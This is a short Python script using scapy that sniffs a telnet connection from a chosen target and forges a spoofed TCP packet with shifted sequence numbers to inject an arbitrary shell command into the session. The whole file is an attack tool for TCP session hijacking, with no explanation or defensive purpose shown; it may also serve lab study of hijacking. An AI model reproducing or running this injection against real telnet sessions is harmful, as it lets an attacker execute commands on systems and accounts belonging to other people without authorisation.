#!/usr/bin/python
from scapy.all import *
import argparse

def getArguments():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", dest="target")
	parser.add_argument("-c", dest="command")
	(options) = parser.parse_args()
	return options

def tcp_jack(pkt, command):
	ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
	tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq + 1, ack=pkt[TCP].ack + 1)
	data = "\nclear\n" + command + "\n"
	new_pkt = ip/tcp/data
	new_pkt.show()
	send(new_pkt, verbose=0)

def findPacket(args):
	pkt = sniff(filter="tcp src " + args.target + " and dst port 23", count=1)
	tcp_jack(pkt[0], args.command)

args = getArguments()
findPacket(args)